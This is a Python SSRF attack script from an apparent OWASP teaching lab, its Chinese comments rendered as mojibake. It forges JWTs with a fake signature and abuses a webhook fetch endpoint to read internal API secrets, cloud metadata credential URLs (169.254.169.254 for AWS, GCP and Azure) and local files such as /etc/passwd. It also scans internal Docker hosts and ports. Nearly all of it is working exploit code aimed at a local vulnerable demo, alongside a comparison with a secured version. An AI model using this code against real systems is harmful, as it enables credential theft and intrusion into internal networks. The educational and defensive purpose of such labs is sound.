#!/usr/bin/env python3
"""
SSRFï¼ˆServer-Side Request Forgeryï¼‰æ”»æ“Šè…³æœ¬
===========================================

âš ï¸ æ³¨æ„ï¼šSSRF å±¬æ–¼ OWASP A10:2021
å®Œæ•´ç‰ˆæœ¬è«‹è¦‹ï¼šscripts/a10/ssrf_exploit.py
é€²éš URL Bypass æŠ€è¡“è«‹è¦‹ï¼šscripts/a10/url_bypass.py

æ­¤è…³æœ¬ä¿ç•™æ–¼ A01 ç›®éŒ„æ˜¯å› ç‚º SSRF ä¹Ÿå¯è¦–ç‚ºå­˜å–æ§åˆ¶ç¹éçš„ä¸€ç¨®å½¢å¼ã€‚

---

æ­¤è…³æœ¬å±•ç¤ºå¦‚ä½•åˆ©ç”¨ SSRF æ¼æ´å­˜å–å…§éƒ¨æœå‹™ã€‚

æ”»æ“ŠåŸç†ï¼š
---------
æ¼æ´ç‰ˆæœ¬çš„ Webhook API å…è¨±ä½¿ç”¨è€…æŒ‡å®šä»»æ„ URLï¼Œ
ä¼ºæœå™¨æœƒä»£æ›¿ä½¿ç”¨è€…ç™¼é€è«‹æ±‚ã€‚æ”»æ“Šè€…å¯ä»¥ï¼š
1. å­˜å–å…§éƒ¨æœå‹™ï¼ˆå¦‚ internal-api:8080ï¼‰
2. æƒæå…§éƒ¨ç¶²è·¯
3. è®€å–é›²ç«¯ metadataï¼ˆå¦‚ 169.254.169.254ï¼‰
4. ç¹éé˜²ç«ç‰†å­˜å–å—ä¿è­·è³‡æº

ä½œè€…ï¼šOWASP Demo
"""

import requests
import json
import argparse
import base64
from datetime import datetime, timedelta

# é…ç½®
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# å…§éƒ¨æœå‹™ç«¯é»ï¼ˆSSRF ç›®æ¨™ï¼‰
INTERNAL_TARGETS = [
    "http://internal-api:8080/",
    "http://internal-api:8080/secrets",
    "http://internal-api:8080/admin/config",
    "http://internal-api:8080/admin/users",
    "http://internal-api:8080/metrics",
    "http://internal-api:8080/export/all",
    "http://internal-api:8080/cloud-metadata",
]

# å¸¸è¦‹çš„é›²ç«¯ metadata ç«¯é»
CLOUD_METADATA = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
    ],
    "GCP": [
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
}


def base64url_encode(data: bytes) -> str:
    """Base64 URL ç·¨ç¢¼"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def create_token(user_id: int = 2, username: str = "user", role: str = "USER") -> str:
    """å»ºç«‹å½é€ çš„ JWT Token"""
    header = {"alg": "HS256", "typ": "JWT"}
    now = datetime.utcnow()
    payload = {
        "sub": username,
        "userId": user_id,
        "username": username,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=24)).timestamp())
    }
    
    header_encoded = base64url_encode(json.dumps(header).encode())
    payload_encoded = base64url_encode(json.dumps(payload).encode())
    fake_signature = base64url_encode(b"FAKE")
    
    return f"{header_encoded}.{payload_encoded}.{fake_signature}"


def ssrf_test_url(target_url: str, token: str, url: str = VULNERABLE_URL) -> tuple:
    """
    ä½¿ç”¨ SSRF æ¸¬è©¦ç›®æ¨™ URL
    å›å‚³ (æˆåŠŸèˆ‡å¦, å›æ‡‰å…§å®¹)
    """
    try:
        response = requests.post(
            f"{url}/api/webhook/test",
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json"
            },
            json={"url": target_url},
            timeout=10
        )
        
        if response.status_code == 200:
            return True, response.json()
        else:
            return False, f"HTTP {response.status_code}: {response.text[:100]}"
    except Exception as e:
        return False, str(e)


def ssrf_fetch_url(target_url: str, token: str, url: str = VULNERABLE_URL) -> tuple:
    """
    ä½¿ç”¨ SSRF ç²å– URL å…§å®¹
    """
    try:
        response = requests.get(
            f"{url}/api/webhook/fetch",
            headers={"Authorization": f"Bearer {token}"},
            params={"url": target_url},
            timeout=10
        )
        
        if response.status_code == 200:
            return True, response.text
        else:
            return False, f"HTTP {response.status_code}"
    except Exception as e:
        return False, str(e)


def attack_internal_service(token: str):
    """
    ğŸ”´ æ”»æ“Šï¼šå­˜å–å…§éƒ¨æœå‹™
    """
    print("\n" + "=" * 60)
    print("ğŸ”´ SSRF æ”»æ“Šï¼šå­˜å–å…§éƒ¨æœå‹™")
    print("=" * 60)
    print("ğŸ“ ç›®æ¨™ï¼šinternal-api:8080ï¼ˆDocker å…§éƒ¨ç¶²è·¯ï¼‰")
    print("   é€™å€‹æœå‹™æ²’æœ‰å°å¤–æš´éœ²ç«¯å£ï¼Œæ­£å¸¸æƒ…æ³ä¸‹ç„¡æ³•å¾å¤–éƒ¨å­˜å–")
    
    found_secrets = []
    
    for target in INTERNAL_TARGETS:
        print(f"\nğŸ“‹ å˜—è©¦ï¼š{target}")
        
        success, result = ssrf_fetch_url(target, token, VULNERABLE_URL)
        
        if success:
            print(f"âœ… æˆåŠŸå­˜å–ï¼")
            try:
                data = json.loads(result)
                # æ ¼å¼åŒ–è¼¸å‡º
                print(json.dumps(data, indent=2, ensure_ascii=False)[:500])
                
                # æª¢æŸ¥æ˜¯å¦æœ‰ flag
                if "flag" in str(data).lower():
                    flag = data.get("flag", "")
                    if flag:
                        found_secrets.append(("FLAG", flag))
                        print(f"\nğŸš© ç™¼ç¾ FLAG: {flag}")
                
                # æª¢æŸ¥æ•æ„Ÿè³‡è¨Š
                if "secrets" in data:
                    found_secrets.append(("Secrets", data["secrets"]))
                    
            except json.JSONDecodeError:
                print(f"   {result[:200]}...")
        else:
            print(f"âŒ å¤±æ•—ï¼š{result}")
    
    if found_secrets:
        print("\n" + "=" * 60)
        print("ğŸ¯ ç™¼ç¾çš„æ•æ„Ÿè³‡è¨Šï¼š")
        print("=" * 60)
        for name, value in found_secrets:
            print(f"\nğŸ“Œ {name}:")
            if isinstance(value, dict):
                print(json.dumps(value, indent=2, ensure_ascii=False))
            else:
                print(f"   {value}")


def attack_internal_network_scan(token: str, subnet: str = "10.0.0"):
    """
    ğŸ”´ æ”»æ“Šï¼šæƒæå…§éƒ¨ç¶²è·¯
    """
    print("\n" + "=" * 60)
    print(f"ğŸ”´ SSRF æ”»æ“Šï¼šæƒæå…§éƒ¨ç¶²è·¯ {subnet}.x")
    print("=" * 60)
    
    # å¸¸è¦‹çš„å…§éƒ¨æœå‹™åŸ 
    common_ports = [80, 8080, 443, 3000, 5000, 6379, 27017, 3306, 5432]
    
    # æƒæ Docker ç¶²è·¯ä¸­çš„æœå‹™
    docker_hosts = [
        "postgres",
        "internal-api", 
        "backend-vulnerable",
        "backend-secure",
        "redis",
        "mongodb",
        "elasticsearch",
    ]
    
    print("\nğŸ“‹ æƒæ Docker å…§éƒ¨æœå‹™...")
    found_services = []
    
    for host in docker_hosts:
        for port in [80, 8080, 5432, 6379]:
            target = f"http://{host}:{port}/"
            
            success, result = ssrf_test_url(target, token, VULNERABLE_URL)
            
            if success and result.get("reachable"):
                found_services.append(f"{host}:{port}")
                print(f"âœ… {host}:{port} - å¯é”")
            # ä¸æ‰“å°å¤±æ•—çš„ï¼Œå¤ªå¤šäº†
    
    if found_services:
        print(f"\nğŸ“Š ç™¼ç¾ {len(found_services)} å€‹å…§éƒ¨æœå‹™")
    else:
        print("\nğŸ“Š æœªç™¼ç¾é¡å¤–æœå‹™ï¼ˆå¯èƒ½æ˜¯é˜²ç«ç‰†é˜»æ“‹ï¼‰")


def attack_cloud_metadata(token: str):
    """
    ğŸ”´ æ”»æ“Šï¼šè®€å–é›²ç«¯ Metadata
    """
    print("\n" + "=" * 60)
    print("ğŸ”´ SSRF æ”»æ“Šï¼šé›²ç«¯ Metadata ç«Šå–")
    print("=" * 60)
    print("ğŸ“ é€™é¡æ”»æ“Šåœ¨é›²ç«¯ç’°å¢ƒä¸­éå¸¸å±éšªï¼")
    print("   å¯èƒ½æ´©éœ² IAM æ†‘è­‰ã€Instance ID ç­‰æ•æ„Ÿè³‡è¨Š")
    
    for provider, endpoints in CLOUD_METADATA.items():
        print(f"\nğŸ“‹ æ¸¬è©¦ {provider} Metadata...")
        
        for endpoint in endpoints:
            success, result = ssrf_fetch_url(endpoint, token, VULNERABLE_URL)
            
            if success and len(result) > 0:
                print(f"âœ… {endpoint}")
                print(f"   {result[:200]}...")
            else:
                print(f"âŒ {endpoint}: ç„¡æ³•å­˜å–ï¼ˆå¯èƒ½ä¸åœ¨é›²ç«¯ç’°å¢ƒï¼‰")
    
    # æ¸¬è©¦æ¨¡æ“¬çš„ cloud-metadata
    print("\nğŸ“‹ æ¸¬è©¦æ¨¡æ“¬çš„ Cloud Metadataï¼ˆinternal-apiï¼‰...")
    success, result = ssrf_fetch_url(
        "http://internal-api:8080/cloud-metadata", 
        token, 
        VULNERABLE_URL
    )
    
    if success:
        print("âœ… æˆåŠŸç²å–æ¨¡æ“¬çš„ Cloud Metadata:")
        try:
            data = json.loads(result)
            print(json.dumps(data, indent=2, ensure_ascii=False))
        except:
            print(result[:500])


def attack_file_protocol(token: str):
    """
    ğŸ”´ æ”»æ“Šï¼šä½¿ç”¨ file:// å”å®š
    """
    print("\n" + "=" * 60)
    print("ğŸ”´ SSRF æ”»æ“Šï¼šfile:// å”å®šæ¸¬è©¦")
    print("=" * 60)
    
    file_targets = [
        "file:///etc/passwd",
        "file:///flag.txt",
        "file:///app/application.properties",
    ]
    
    for target in file_targets:
        print(f"\nğŸ“‹ å˜—è©¦ï¼š{target}")
        success, result = ssrf_fetch_url(target, token, VULNERABLE_URL)
        
        if success:
            print(f"âœ… æˆåŠŸï¼")
            print(f"   {result[:200]}...")
        else:
            print(f"âŒ å¤±æ•—ï¼š{result}")
    
    print("\nğŸ’¡ å‚™è¨»ï¼šå¤§å¤šæ•¸ HTTP å®¢æˆ¶ç«¯é è¨­ä¸æ”¯æ´ file:// å”å®š")


def compare_vulnerability():
    """
    æ¯”è¼ƒæ¼æ´ç‰ˆæœ¬èˆ‡å®‰å…¨ç‰ˆæœ¬
    """
    print("\n" + "=" * 60)
    print("ğŸ“Š SSRFï¼šæ¼æ´ç‰ˆæœ¬ vs å®‰å…¨ç‰ˆæœ¬")
    print("=" * 60)
    
    token = create_token()
    target = "http://internal-api:8080/secrets"
    
    # æ¼æ´ç‰ˆæœ¬
    print("\nğŸ”“ æ¼æ´ç‰ˆæœ¬ï¼ˆhttp://localhost:8081ï¼‰ï¼š")
    success, result = ssrf_fetch_url(target, token, VULNERABLE_URL)
    if success:
        print(f"   âœ… æˆåŠŸå­˜å–å…§éƒ¨æœå‹™ï¼")
        try:
            data = json.loads(result)
            if "flag" in data:
                print(f"   ğŸš© FLAG: {data['flag']}")
        except:
            pass
    else:
        print(f"   çµæœï¼š{result}")
    
    # å®‰å…¨ç‰ˆæœ¬
    print("\nğŸ”’ å®‰å…¨ç‰ˆæœ¬ï¼ˆhttp://localhost:8082ï¼‰ï¼š")
    try:
        success, result = ssrf_fetch_url(target, token, SECURE_URL)
        if success:
            print(f"   âš ï¸ æ„å¤–æˆåŠŸ")
        else:
            print(f"   âœ… æ­£ç¢ºé˜»æ“‹ï¼š{result}")
    except Exception as e:
        print(f"   âœ… è«‹æ±‚è¢«æ‹’çµ•")
    
    print("\nğŸ“‹ å®‰å…¨ç‰ˆæœ¬çš„é˜²ç¦¦æªæ–½ï¼š")
    print("   1. URL ç™½åå–®ï¼ˆåªå…è¨±ç‰¹å®šåŸŸåï¼‰")
    print("   2. é˜»æ“‹ç§æœ‰ IPï¼ˆ10.x, 172.16-31.x, 192.168.xï¼‰")
    print("   3. é˜»æ“‹ localhost å’Œ 127.0.0.1")
    print("   4. é˜»æ“‹ç‰¹æ®Šå”å®šï¼ˆfile://, gopher://, etc.ï¼‰")
    print("   5. éœ€è¦ ADMIN æ¬Šé™")
    print("   6. è¨˜éŒ„æ‰€æœ‰è«‹æ±‚ï¼ˆå¯©è¨ˆè¿½è¹¤ï¼‰")


def main():
    parser = argparse.ArgumentParser(
        description="SSRF æ”»æ“Šå·¥å…·",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ç¯„ä¾‹ï¼š
  python ssrf_exploit.py --internal            # å­˜å–å…§éƒ¨æœå‹™
  python ssrf_exploit.py --scan                # æƒæå…§éƒ¨ç¶²è·¯
  python ssrf_exploit.py --cloud               # é›²ç«¯ Metadata æ”»æ“Š
  python ssrf_exploit.py --file                # file:// å”å®šæ¸¬è©¦
  python ssrf_exploit.py --compare             # æ¯”è¼ƒæ¼æ´/å®‰å…¨ç‰ˆæœ¬
  python ssrf_exploit.py --all                 # åŸ·è¡Œå®Œæ•´æ¼”ç¤º
  python ssrf_exploit.py --url <URL>           # æ¸¬è©¦æŒ‡å®š URL
        """
    )
    
    parser.add_argument("--internal", action="store_true", help="å­˜å–å…§éƒ¨æœå‹™")
    parser.add_argument("--scan", action="store_true", help="æƒæå…§éƒ¨ç¶²è·¯")
    parser.add_argument("--cloud", action="store_true", help="é›²ç«¯ Metadata æ”»æ“Š")
    parser.add_argument("--file", action="store_true", help="file:// å”å®šæ¸¬è©¦")
    parser.add_argument("--compare", action="store_true", help="æ¯”è¼ƒæ¼æ´/å®‰å…¨ç‰ˆæœ¬")
    parser.add_argument("--all", action="store_true", help="åŸ·è¡Œå®Œæ•´æ¼”ç¤º")
    parser.add_argument("--url", type=str, help="æ¸¬è©¦æŒ‡å®š URL")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("ğŸŒ SSRF æ”»æ“Šå·¥å…·")
    print("=" * 60)
    print(f"âš ï¸ æ­¤å·¥å…·åƒ…ä¾›æ•™è‚²ç›®çš„ï¼è«‹å‹¿ç”¨æ–¼éæ³•æ´»å‹•ã€‚")
    print(f"ğŸ“ ç›®æ¨™ï¼š{VULNERABLE_URL}")
    
    token = create_token()
    
    if args.url:
        print(f"\nğŸ“‹ æ¸¬è©¦ URLï¼š{args.url}")
        success, result = ssrf_fetch_url(args.url, token, VULNERABLE_URL)
        if success:
            print(f"âœ… æˆåŠŸï¼\n{result[:1000]}")
        else:
            print(f"âŒ å¤±æ•—ï¼š{result}")
    elif args.all:
        attack_internal_service(token)
        attack_cloud_metadata(token)
        compare_vulnerability()
    elif args.internal:
        attack_internal_service(token)
    elif args.scan:
        attack_internal_network_scan(token)
    elif args.cloud:
        attack_cloud_metadata(token)
    elif args.file:
        attack_file_protocol(token)
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\nğŸ’¡ å¿«é€Ÿé–‹å§‹ï¼špython ssrf_exploit.py --all")


if __name__ == "__main__":
    main()
